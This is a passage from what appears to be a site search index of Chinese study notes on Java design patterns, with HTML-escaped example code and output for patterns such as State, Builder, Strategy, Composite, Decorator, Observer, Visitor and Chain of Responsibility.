quarter yet\u0026#34;); } @Override public void turnCrank() { System.out.println(\u0026#34;You turned, but there are no gumballs\u0026#34;); } @Override public void dispense() { System.out.println(\u0026#34;No gumball dispensed\u0026#34;); } } public class SoldState implements State { GumballMachine gumballMachine; public SoldState(GumballMachine gumballMachine) { this.gumballMachine = gumballMachine; } @Override public void insertQuarter() { System.out.println(\u0026#34;Please wait, we\u0026#39;re already giving you a gumball\u0026#34;); } @Override public void ejectQuarter() { System.out.println(\u0026#34;Sorry, you already turned the crank\u0026#34;); } @Override public void turnCrank() { System.out.println(\u0026#34;Turning twice doesn\u0026#39;t get you another gumball!\u0026#34;); } @Override public void dispense() { gumballMachine.releaseBall(); if (gumballMachine.getCount() \u0026gt; 0) { gumballMachine.setState(gumballMachine.getNoQuarterState()); } else { System.out.println(\u0026#34;Oops, out of gumballs\u0026#34;); gumballMachine.setState(gumballMachine.getSoldOutState()); } } } public class GumballMachine { private State soldOutState; private State noQuarterState; private State hasQuarterState; private State soldState; private State state; private int count = 0; public GumballMachine(int numberGumballs) { count = numberGumballs; soldOutState = new SoldOutState(this); noQuarterState = new NoQuarterState(this); hasQuarterState = new HasQuarterState(this); soldState = new SoldState(this); if (numberGumballs \u0026gt; 0) { state = noQuarterState; } else { state = soldOutState; } } public void insertQuarter() { state.insertQuarter(); } public void ejectQuarter() { state.ejectQuarter(); } public void turnCrank() { state.turnCrank(); state.dispense(); } public void setState(State state) { this.state = state; } public void releaseBall() { System.out.println(\u0026#34;A gumball comes rolling out the slot...\u0026#34;); if (count != 0) { count -= 1; } } public State getSoldOutState() { return soldOutState; } public State getNoQuarterState() { return noQuarterState; } public State getHasQuarterState() { return hasQuarterState; } public State getSoldState() { return soldState; } public int getCount() { return count; } } public class Client { public static void main(String[] args) { GumballMachine gumballMachine = new GumballMachine(5); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.ejectQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.ejectQuarter(); gumballMachine.insertQuarter(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); } } You insert a quarter You turned... A gumball comes rolling out the slot... You insert a quarter Quarter returned You turned, but there\u0026#39;s no quarter You need to pay first You insert a quarter You turned... A gumball comes rolling out the slot... You insert a quarter You turned... A gumball comes rolling out the slot... You haven\u0026#39;t insert a quarter You insert a quarter You can\u0026#39;t insert another quarter You turned... A gumball comes rolling out the slot... You insert a quarter You turned... A gumball comes rolling out the slot... Oops, out of gumballs You can\u0026#39;t insert a quarter, the machine is sold out You turned, but there are no gumballs No gumball dispensed "},{"id":389,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%94%9F%E6%88%90%E5%99%A8/","title":"设计模式 - 生成器","parent":"设计模式","content":"5. 生成器（Builder）    Intent    封装一个对象的构造过程，并允许按步骤构造。\nClass Diagram    \nImplementation    以下是一个简易的 StringBuilder 实现，参考了 JDK 1.8 源码。\npublic class AbstractStringBuilder { protected char[] value; protected int count; public AbstractStringBuilder(int capacity) { count = 0; value = new char[capacity]; } public AbstractStringBuilder append(char c) { ensureCapacityInternal(count + 1); value[count++] = c; return this; } private void ensureCapacityInternal(int minimumCapacity) { // overflow-conscious code  if (minimumCapacity - value.length \u0026gt; 0) expandCapacity(minimumCapacity); } void expandCapacity(int minimumCapacity) { int newCapacity = value.length * 2 + 2; if (newCapacity - minimumCapacity \u0026lt; 0) newCapacity = minimumCapacity; if (newCapacity \u0026lt; 0) { if (minimumCapacity \u0026lt; 0) // overflow  throw new OutOfMemoryError(); newCapacity = Integer.MAX_VALUE; } value = Arrays.copyOf(value, newCapacity); } } public class StringBuilder extends AbstractStringBuilder { public StringBuilder() { super(16); } @Override public String toString() { // Create a copy, don\u0026#39;t share the array  return new String(value, 0, count); } } public class Client { public static void main(String[] args) { StringBuilder sb = new StringBuilder(); final int count = 26; for (int i = 0; i \u0026lt; count; i++) { sb.append((char) (\u0026#39;a\u0026#39; + i)); } System.out.println(sb.toString()); } } abcdefghijklmnopqrstuvwxyz JDK     java.lang.StringBuilder java.nio.ByteBuffer java.lang.StringBuffer java.lang.Appendable Apache Camel builders  "},{"id":390,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%9B%AE%E5%BD%95/","title":"设计模式 - 目录","parent":"设计模式","content":"设计模式目录    一、前言    设计模式是解决问题的方案，学习现有的设计模式可以做到经验复用。拥有设计模式词汇，在沟通时就能用更少的词汇来讨论，并且不需要了解底层细节。\n二、创建型     单例.md 简单工厂.md 工厂方法.md 抽象工厂.md 生成器.md 原型模式.md  三、行为型     责任链.md 命令.md 解释器.md 迭代器.md 中介者.md 备忘录.md 观察者.md 状态.md 策略.md 模板方法.md 访问者.md 空对象.md  四、结构型     适配器.md 桥接.md 组合.md 装饰.md 外观.md 享元.md 代理.md  参考资料     弗里曼. Head First 设计模式 [M]. 中国电力出版社, 2007. Gamma E. 设计模式: 可复用面向对象软件的基础 [M]. 机械工业出版社, 2007. Bloch J. Effective java[M]. Addison-Wesley Professional, 2017. Design Patterns Design patterns implemented in Java The breakdown of design patterns in JDK  "},{"id":391,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%9B%AE%E5%BD%951/","title":"设计模式 - 目录1","parent":"设计模式","content":"一、前言    设计模式是解决问题的方案，学习现有的设计模式可以做到经验复用。拥有设计模式词汇，在沟通时就能用更少的词汇来讨论，并且不需要了解底层细节。\n二、创建型     单例.md 简单工厂.md 工厂方法.md 抽象工厂.md 生成器.md 原型模式.md  三、行为型     责任链.md 命令.md 解释器.md 迭代器.md 中介者.md 备忘录.md 观察者.md 状态.md 策略.md 模板方法.md 访问者.md 空对象.md  四、结构型     适配器.md 桥接.md 组合.md 装饰.md 外观.md 享元.md 代理.md  参考资料     弗里曼. Head First 设计模式 [M]. 中国电力出版社, 2007. Gamma E. 设计模式: 可复用面向对象软件的基础 [M]. 机械工业出版社, 2007. Bloch J. Effective java[M]. Addison-Wesley Professional, 2017. Design Patterns Design patterns implemented in Java The breakdown of design patterns in JDK  "},{"id":392,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%A9%BA%E5%AF%B9%E8%B1%A1/","title":"设计模式 - 空对象","parent":"设计模式","content":"空对象（Null）    Intent    使用什么都不做\n的空对象来代替 NULL。\n一个方法返回 NULL，意味着方法的调用端需要去检查返回值是否是 NULL，这么做会导致非常多的冗余的检查代码。并且如果某一个调用端忘记了做这个检查返回值，而直接使用返回的对象，那么就有可能抛出空指针异常。\nClass Diagram    \nImplementation    public abstract class AbstractOperation { abstract void request(); } public class RealOperation extends AbstractOperation { @Override void request() { System.out.println(\u0026#34;do something\u0026#34;); } } public class NullOperation extends AbstractOperation{ @Override void request() { // do nothing  } } public class Client { public static void main(String[] args) { AbstractOperation abstractOperation = func(-1); abstractOperation.request(); } public static AbstractOperation func(int para) { if (para \u0026lt; 0) { return new NullOperation(); } return new RealOperation(); } } "},{"id":393,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%AD%96%E7%95%A5/","title":"设计模式 - 策略","parent":"设计模式","content":"9. 策略（Strategy）    Intent    定义一系列算法，封装每个算法，并使它们可以互换。\n策略模式可以让算法独立于使用它的客户端。\nClass Diagram     Strategy 接口定义了一个算法族，它们都实现了 behavior() 方法。 Context 是使用到该算法族的类，其中的 doSomething() 方法会调用 behavior()，setStrategy(Strategy) 方法可以动态地改变 strategy 对象，也就是说能动态地改变 Context 所使用的算法。  \n与状态模式的比较    状态模式的类图和策略模式类似，并且都是能够动态改变对象的行为。但是状态模式是通过状态转移来改变 Context 所组合的 State 对象，而策略模式是通过 Context 本身的决策来改变组合的 Strategy 对象。所谓的状态转移，是指 Context 在运行过程中由于一些条件发生改变而使得 State 对象发生改变，注意必须要是在运行过程中。\n状态模式主要是用来解决状态转移的问题，当状态发生转移了，那么 Context 对象就会改变它的行为；而策略模式主要是用来封装一组可以互相替代的算法族，并且可以根据需要动态地去替换 Context 使用的算法。\nImplementation    设计一个鸭子，它可以动态地改变叫声。这里的算法族是鸭子的叫声行为。\npublic interface QuackBehavior { void quack(); } public class Quack implements QuackBehavior { @Override public void quack() { System.out.println(\u0026#34;quack!\u0026#34;); } } public class Squeak implements QuackBehavior{ @Override public void quack() { System.out.println(\u0026#34;squeak!\u0026#34;); } } public class Duck { private QuackBehavior quackBehavior; public void performQuack() { if (quackBehavior != null) { quackBehavior.quack(); } } public void setQuackBehavior(QuackBehavior quackBehavior) { this.quackBehavior = quackBehavior; } } public class Client { public static void main(String[] args) { Duck duck = new Duck(); duck.setQuackBehavior(new Squeak()); duck.performQuack(); duck.setQuackBehavior(new Quack()); duck.performQuack(); } } squeak! quack! JDK     java.util.Comparator#compare() javax.servlet.http.HttpServlet javax.servlet.Filter#doFilter()  "},{"id":394,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82/","title":"设计模式 - 简单工厂","parent":"设计模式","content":"简单工厂（Simple Factory）    Intent    在创建一个对象时不向客户暴露内部细节，并提供一个创建对象的通用接口。\nClass Diagram    简单工厂把实例化的操作单独放到一个类中，这个类就成为简单工厂类，让简单工厂类来决定应该用哪个具体子类来实例化。\n这样做能把客户类和具体子类的实现解耦，客户类不再需要知道有哪些子类以及应当实例化哪个子类。客户类往往有多个，如果不使用简单工厂，那么所有的客户类都要知道所有子类的细节。而且一旦子类发生改变，例如增加子类，那么所有的客户类都要进行修改。\n\nImplementation    public interface Product { } public class ConcreteProduct implements Product { } public class ConcreteProduct1 implements Product { } public class ConcreteProduct2 implements Product { } 以下的 Client 类包含了实例化的代码，这是一种错误的实现。如果在客户类中存在这种实例化代码，就需要考虑将代码放到简单工厂中。\npublic class Client { public static void main(String[] args) { int type = 1; Product product; if (type == 1) { product = new ConcreteProduct1(); } else if (type == 2) { product = new ConcreteProduct2(); } else { product = new ConcreteProduct(); } // do something with the product  } } 以下的 SimpleFactory 是简单工厂实现，它被所有需要进行实例化的客户类调用。\npublic class SimpleFactory { public Product createProduct(int type) { if (type == 1) { return new ConcreteProduct1(); } else if (type == 2) { return new ConcreteProduct2(); } return new ConcreteProduct(); } } public class Client { public static void main(String[] args) { SimpleFactory simpleFactory = new SimpleFactory(); Product product = simpleFactory.createProduct(1); // do something with the product  } } "},{"id":395,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%BB%84%E5%90%88/","title":"设计模式 - 组合","parent":"设计模式","content":"组合（Composite）    Intent    将对象组合成树形结构来表示“整体/部分”层次关系，允许用户以相同的方式处理单独对象和组合对象。\nClass Diagram    组件（Component）类是组合类（Composite）和叶子类（Leaf）的父类，可以把组合类看成是树的中间节点。\n组合对象拥有一个或者多个组件对象，因此组合对象的操作可以委托给组件对象去处理，而组件对象可以是另一个组合对象或者叶子对象。\n\nImplementation    public abstract class Component { protected String name; public Component(String name) { this.name = name; } public void print() { print(0); } abstract void print(int level); abstract public void add(Component component); abstract public void remove(Component component); } public class Composite extends Component { private List\u0026lt;Component\u0026gt; child; public Composite(String name) { super(name); child = new ArrayList\u0026lt;\u0026gt;(); } @Override void print(int level) { for (int i = 0; i \u0026lt; level; i++) { System.out.print(\u0026#34;--\u0026#34;); } System.out.println(\u0026#34;Composite:\u0026#34; + name); for (Component component : child) { component.print(level + 1); } } @Override public void add(Component component) { child.add(component); } @Override public void remove(Component component) { child.remove(component); } } public class Leaf extends Component { public Leaf(String name) { super(name); } @Override void print(int level) { for (int i = 0; i \u0026lt; level; i++) { System.out.print(\u0026#34;--\u0026#34;); } System.out.println(\u0026#34;left:\u0026#34; + name); } @Override public void add(Component component) { throw new UnsupportedOperationException(); // 牺牲透明性换取单一职责原则，这样就不用考虑是叶子节点还是组合节点  } @Override public void remove(Component component) { throw new UnsupportedOperationException(); } } public class Client { public static void main(String[] args) { Composite root = new Composite(\u0026#34;root\u0026#34;); Component node1 = new Leaf(\u0026#34;1\u0026#34;); Component node2 = new Composite(\u0026#34;2\u0026#34;); Component node3 = new Leaf(\u0026#34;3\u0026#34;); root.add(node1); root.add(node2); root.add(node3); Component node21 = new Leaf(\u0026#34;21\u0026#34;); Component node22 = new Composite(\u0026#34;22\u0026#34;); node2.add(node21); node2.add(node22); Component node221 = new Leaf(\u0026#34;221\u0026#34;); node22.add(node221); root.print(); } } Composite:root --left:1 --Composite:2 ----left:21 ----Composite:22 ------left:221 --left:3 JDK     javax.swing.JComponent#add(Component) java.awt.Container#add(Component) java.util.Map#putAll(Map) java.util.List#addAll(Collection) java.util.Set#addAll(Collection)  "},{"id":396,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%A3%85%E9%A5%B0/","title":"设计模式 - 装饰","parent":"设计模式","content":"装饰（Decorator）    Intent    为对象动态添加功能。\nClass Diagram    装饰者（Decorator）和具体组件（ConcreteComponent）都继承自组件（Component），具体组件的方法实现不需要依赖于其它对象，而装饰者组合了一个组件，这样它可以装饰其它装饰者或者具体组件。所谓装饰，就是把这个装饰者套在被装饰者之上，从而动态扩展被装饰者的功能。装饰者的方法有一部分是自己的，这属于它的功能，然后调用被装饰者的方法实现，从而也保留了被装饰者的功能。可以看到，具体组件应当是装饰层次的最低层，因为只有具体组件的方法实现不需要依赖于其它对象。\n\nImplementation    设计不同种类的饮料，饮料可以添加配料，比如可以添加牛奶，并且支持动态添加新配料。每增加一种配料，该饮料的价格就会增加，要求计算一种饮料的价格。\n下图表示在 DarkRoast 饮料上新增新添加 Mocha 配料，之后又添加了 Whip 配料。DarkRoast 被 Mocha 包裹，Mocha 又被 Whip 包裹。它们都继承自相同父类，都有 cost() 方法，外层类的 cost() 方法调用了内层类的 cost() 方法。\n\npublic interface Beverage { double cost(); } public class DarkRoast implements Beverage { @Override public double cost() { return 1; } } public class HouseBlend implements Beverage { @Override public double cost() { return 1; } } public abstract class CondimentDecorator implements Beverage { protected Beverage beverage; } public class Milk extends CondimentDecorator { public Milk(Beverage beverage) { this.beverage = beverage; } @Override public double cost() { return 1 + beverage.cost(); } } public class Mocha extends CondimentDecorator { public Mocha(Beverage beverage) { this.beverage = beverage; } @Override public double cost() { return 1 + beverage.cost(); } } public class Client { public static void main(String[] args) { Beverage beverage = new HouseBlend(); beverage = new Mocha(beverage); beverage = new Milk(beverage); System.out.println(beverage.cost()); } } 3.0 设计原则    类应该对扩展开放，对修改关闭：也就是添加新功能时不需要修改代码。饮料可以动态添加新的配料，而不需要去修改饮料的代码。\n不可能把所有的类设计成都满足这一原则，应当把该原则应用于最有可能发生改变的地方。\nJDK     java.io.BufferedInputStream(InputStream) java.io.DataInputStream(InputStream) java.io.BufferedOutputStream(OutputStream) java.util.zip.ZipOutputStream(OutputStream) java.util.Collections#checkedList|Map|Set|SortedSet|SortedMap  "},{"id":397,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%A7%82%E5%AF%9F%E8%80%85/","title":"设计模式 - 观察者","parent":"设计模式","content":"7. 观察者（Observer）    Intent    定义对象之间的一对多依赖，当一个对象状态改变时，它的所有依赖都会收到通知并且自动更新状态。\n主题（Subject）是被观察的对象，而其所有依赖者（Observer）称为观察者。\n\nClass Diagram    主题（Subject）具有注册和移除观察者、并通知所有观察者的功能，主题是通过维护一张观察者列表来实现这些操作的。\n观察者（Observer）的注册功能需要调用主题的 registerObserver() 方法。\n\nImplementation    天气数据布告板会在天气信息发生改变时更新其内容，布告板有多个，并且在将来会继续增加。\n\npublic interface Subject { void registerObserver(Observer o); void removeObserver(Observer o); void notifyObserver(); } public class WeatherData implements Subject { private List\u0026lt;Observer\u0026gt; observers; private float temperature; private float humidity; private float pressure; public WeatherData() { observers = new ArrayList\u0026lt;\u0026gt;(); } public void setMeasurements(float temperature, float humidity, float pressure) { this.temperature = temperature; this.humidity = humidity; this.pressure = pressure; notifyObserver(); } @Override public void registerObserver(Observer o) { observers.add(o); } @Override public void removeObserver(Observer o) { int i = observers.indexOf(o); if (i \u0026gt;= 0) { observers.remove(i); } } @Override public void notifyObserver() { for (Observer o : observers) { o.update(temperature, humidity, pressure); } } } public interface Observer { void update(float temp, float humidity, float pressure); } public class StatisticsDisplay implements Observer { public StatisticsDisplay(Subject weatherData) { weatherData.registerObserver(this); } @Override public void update(float temp, float humidity, float pressure) { System.out.println(\u0026#34;StatisticsDisplay.update: \u0026#34; + temp + \u0026#34; \u0026#34; + humidity + \u0026#34; \u0026#34; + pressure); } } public class CurrentConditionsDisplay implements Observer { public CurrentConditionsDisplay(Subject weatherData) { weatherData.registerObserver(this); } @Override public void update(float temp, float humidity, float pressure) { System.out.println(\u0026#34;CurrentConditionsDisplay.update: \u0026#34; + temp + \u0026#34; \u0026#34; + humidity + \u0026#34; \u0026#34; + pressure); } } public class WeatherStation { public static void main(String[] args) { WeatherData weatherData = new WeatherData(); CurrentConditionsDisplay currentConditionsDisplay = new CurrentConditionsDisplay(weatherData); StatisticsDisplay statisticsDisplay = new StatisticsDisplay(weatherData); weatherData.setMeasurements(0, 0, 0); weatherData.setMeasurements(1, 1, 1); } } CurrentConditionsDisplay.update: 0.0 0.0 0.0 StatisticsDisplay.update: 0.0 0.0 0.0 CurrentConditionsDisplay.update: 1.0 1.0 1.0 StatisticsDisplay.update: 1.0 1.0 1.0 JDK     java.util.Observer java.util.EventListener javax.servlet.http.HttpSessionBindingListener RxJava  "},{"id":398,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%A7%A3%E9%87%8A%E5%99%A8/","title":"设计模式 - 解释器","parent":"设计模式","content":"解释器（Interpreter）    Intent    为语言创建解释器，通常由语言的语法和语法分析来定义。\nClass Diagram     TerminalExpression：终结符表达式，每个终结符都需要一个 TerminalExpression。 Context：上下文，包含解释器之外的一些全局信息。  \nImplementation    以下是一个规则检验器实现，具有 and 和 or 规则，通过规则可以构建一颗解析树，用来检验一个文本是否满足解析树定义的规则。\n例如一颗解析树为 D And (A Or (B C))，文本 \u0026ldquo;D A\u0026rdquo; 满足该解析树定义的规则。\n这里的 Context 指的是 String。\npublic abstract class Expression { public abstract boolean interpret(String str); } public class TerminalExpression extends Expression { private String literal = null; public TerminalExpression(String str) { literal = str; } public boolean interpret(String str) { StringTokenizer st = new StringTokenizer(str); while (st.hasMoreTokens()) { String test = st.nextToken(); if (test.equals(literal)) { return true; } } return false; } } public class AndExpression extends Expression { private Expression expression1 = null; private Expression expression2 = null; public AndExpression(Expression expression1, Expression expression2) { this.expression1 = expression1; this.expression2 = expression2; } public boolean interpret(String str) { return expression1.interpret(str) \u0026amp;\u0026amp; expression2.interpret(str); } } public class OrExpression extends Expression { private Expression expression1 = null; private Expression expression2 = null; public OrExpression(Expression expression1, Expression expression2) { this.expression1 = expression1; this.expression2 = expression2; } public boolean interpret(String str) { return expression1.interpret(str) || expression2.interpret(str); } } public class Client { /** * 构建解析树 */ public static Expression buildInterpreterTree() { // Literal  Expression terminal1 = new TerminalExpression(\u0026#34;A\u0026#34;); Expression terminal2 = new TerminalExpression(\u0026#34;B\u0026#34;); Expression terminal3 = new TerminalExpression(\u0026#34;C\u0026#34;); Expression terminal4 = new TerminalExpression(\u0026#34;D\u0026#34;); // B C  Expression alternation1 = new OrExpression(terminal2, terminal3); // A Or (B C)  Expression alternation2 = new OrExpression(terminal1, alternation1); // D And (A Or (B C))  return new AndExpression(terminal4, alternation2); } public static void main(String[] args) { Expression define = buildInterpreterTree(); String context1 = \u0026#34;D A\u0026#34;; String context2 = \u0026#34;A B\u0026#34;; System.out.println(define.interpret(context1)); System.out.println(define.interpret(context2)); } } true false JDK     java.util.Pattern java.text.Normalizer All subclasses of java.text.Format javax.el.ELResolver  "},{"id":399,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%AE%BF%E9%97%AE%E8%80%85/","title":"设计模式 - 访问者","parent":"设计模式","content":"访问者（Visitor）    Intent    为一个对象结构（比如组合结构）增加新能力。\nClass Diagram     Visitor：访问者，为每一个 ConcreteElement 声明一个 visit 操作 ConcreteVisitor：具体访问者，存储遍历过程中的累计结果 ObjectStructure：对象结构，可以是组合结构，或者是一个集合。  \nImplementation    public interface Element { void accept(Visitor visitor); } class CustomerGroup { private List\u0026lt;Customer\u0026gt; customers = new ArrayList\u0026lt;\u0026gt;(); void accept(Visitor visitor) { for (Customer customer : customers) { customer.accept(visitor); } } void addCustomer(Customer customer) { customers.add(customer); } } public class Customer implements Element { private String name; private List\u0026lt;Order\u0026gt; orders = new ArrayList\u0026lt;\u0026gt;(); Customer(String name) { this.name = name; } String getName() { return name; } void addOrder(Order order) { orders.add(order); } public void accept(Visitor visitor) { visitor.visit(this); for (Order order : orders) { order.accept(visitor); } } } public class Order implements Element { private String name; private List\u0026lt;Item\u0026gt; items = new ArrayList(); Order(String name) { this.name = name; } Order(String name, String itemName) { this.name = name; this.addItem(new Item(itemName)); } String getName() { return name; } void addItem(Item item) { items.add(item); } public void accept(Visitor visitor) { visitor.visit(this); for (Item item : items) { item.accept(visitor); } } } public class Item implements Element { private String name; Item(String name) { this.name = name; } String getName() { return name; } public void accept(Visitor visitor) { visitor.visit(this); } } public interface Visitor { void visit(Customer customer); void visit(Order order); void visit(Item item); } public class GeneralReport implements Visitor { private int customersNo; private int ordersNo; private int itemsNo; public void visit(Customer customer) { System.out.println(customer.getName()); customersNo++; } public void visit(Order order) { System.out.println(order.getName()); ordersNo++; } public void visit(Item item) { System.out.println(item.getName()); itemsNo++; } public void displayResults() { System.out.println(\u0026#34;Number of customers: \u0026#34; + customersNo); System.out.println(\u0026#34;Number of orders: \u0026#34; + ordersNo); System.out.println(\u0026#34;Number of items: \u0026#34; + itemsNo); } } public class Client { public static void main(String[] args) { Customer customer1 = new Customer(\u0026#34;customer1\u0026#34;); customer1.addOrder(new Order(\u0026#34;order1\u0026#34;, \u0026#34;item1\u0026#34;)); customer1.addOrder(new Order(\u0026#34;order2\u0026#34;, \u0026#34;item1\u0026#34;)); customer1.addOrder(new Order(\u0026#34;order3\u0026#34;, \u0026#34;item1\u0026#34;)); Order order = new Order(\u0026#34;order_a\u0026#34;); order.addItem(new Item(\u0026#34;item_a1\u0026#34;)); order.addItem(new Item(\u0026#34;item_a2\u0026#34;)); order.addItem(new Item(\u0026#34;item_a3\u0026#34;)); Customer customer2 = new Customer(\u0026#34;customer2\u0026#34;); customer2.addOrder(order); CustomerGroup customers = new CustomerGroup(); customers.addCustomer(customer1); customers.addCustomer(customer2); GeneralReport visitor = new GeneralReport(); customers.accept(visitor); visitor.displayResults(); } } customer1 order1 item1 order2 item1 order3 item1 customer2 order_a item_a1 item_a2 item_a3 Number of customers: 2 Number of orders: 4 Number of items: 6 JDK     javax.lang.model.element.Element and javax.lang.model.element.ElementVisitor javax.lang.model.type.TypeMirror and javax.lang.model.type.TypeVisitor  "},{"id":400,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%B4%A3%E4%BB%BB%E9%93%BE/","title":"设计模式 - 责任链","parent":"设计模式","content":"责任链（Chain Of Responsibility）    Intent    使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系。将这些对象连成一条链，并沿着这条链发送该请求，直到有一个对象处理它为止。\nClass Diagram     Handler：定义处理请求的接口，并且实现后继链（successor）  \nImplementation    public abstract class Handler { protected Handler successor; public Handler(Handler successor) { this.successor = successor; } protected abstract void handleRequest(Request request); } public class ConcreteHandler1 extends Handler { public ConcreteHandler1(Handler successor) { super(successor); } @Override protected void handleRequest(Request request) { if (request.getType() == RequestType.TYPE1) { System.out.println(request.getName() + \u0026#34; is handle by ConcreteHandler1\u0026#34;); return; } if (successor != null) { successor.handleRequest(request); } } } public class ConcreteHandler2 extends Handler { public ConcreteHandler2(Handler successor) { super(successor); } @Override protected void handleRequest(Request request) { if (request.getType() == RequestType.TYPE2) { System.out.println(request.getName() + \u0026#34; is handle by ConcreteHandler2\u0026#34;); return; } if (successor != null) { successor.handleRequest(request); } } } public class Request { private RequestType type; private String name; public Request(RequestType type, String name) { this.type = type; this.name = name; } public RequestType getType() { return type; } public String getName() { return name; } } public enum RequestType { TYPE1, TYPE2 } public class Client { public static void main(String[] args) { Handler handler1 = new ConcreteHandler1(null); Handler handler2 = new ConcreteHandler2(handler1); Request request1 = new Request(RequestType.TYPE1, \u0026#34;request1\u0026#34;); handler2.handleRequest(request1); Request request2 = new Request(RequestType.TYPE2, \u0026#34;request2\u0026#34;); handler2.handleRequest(request2); } } request1 is handle by ConcreteHandler1 request2 is handle by ConcreteHandler2 JDK     java.util.logging.Logger#log() Apache Commons Chain javax.servlet.Filter#doFilter()  "},{"id":401,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%BF%AD%E4%BB%A3%E5%99%A8/","title":"设计模式 - 迭代器","parent":"设计模式","content":"迭代器（Iterator）    Intent    提供一种顺序访问聚合对象元素的方法，并且不暴露聚合对象的内部表示。\nClass Diagram     Aggregate 是聚合类，其中 createIterator() 方法可以产生一个 Iterator； Iterator 主要定义了 hasNext() 和 next() 方法； Client 组合了 Aggregate，为了迭代遍历 Aggregate，也需要组合 Iterator。  \nImplementation    public interface Aggregate { Iterator createIterator(); } public class ConcreteAggregate implements Aggregate { private Integer[] items; public ConcreteAggregate() { items = new Integer[10]; for (int i = 0; i \u0026lt; items.length; i++) { items[i] = i; } } @Override public Iterator createIterator() { return new ConcreteIterator\u0026lt;Integer\u0026gt;(items); } } public interface Iterator\u0026lt;Item\u0026gt; { Item next(); boolean hasNext(); } public class ConcreteIterator\u0026lt;Item\u0026gt; implements Iterator { private Item[] items; private int position = 0; public ConcreteIterator(Item[] items) { this.items = items; } @Override public Object next() { return items[position++]; } @Override public boolean hasNext() { return position \u0026lt; items.length; } } public class Client { public static void main(String[] args) { Aggregate aggregate = new ConcreteAggregate(); Iterator\u0026lt;Integer\u0026gt; iterator = aggregate.createIterator(); while (iterator.hasNext()) { System.out.println(iterator.next()); } } } JDK     java.util.Iterator java.util.Enumeration  "},{"id":402,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E9%80%82%E9%85%8D%E5%99%A8/","title":"设计模式 - 适配器","parent":"设计模式","content":"1. 适配器（Adapter）    Intent    把一个类接口转换成另一个用户需要的接口。\n\nClass Diagram    \nImplementation    鸭子（Duck）和火鸡（Turkey）拥有不同的叫声，Duck 的叫声调用 quack() 方法，而 Turkey 调用 gobble() 方法。\n要求将 Turkey 的 gobble() 方法适配成 Duck 的 quack() 方法，从而让火鸡冒充鸭子！\npublic interface Duck { void quack(); } public interface Turkey { void gobble(); } public class WildTurkey implements Turkey { @Override public void gobble() { System.out.println(\u0026#34;gobble!\u0026#34;); } } public class TurkeyAdapter implements Duck { Turkey turkey; public 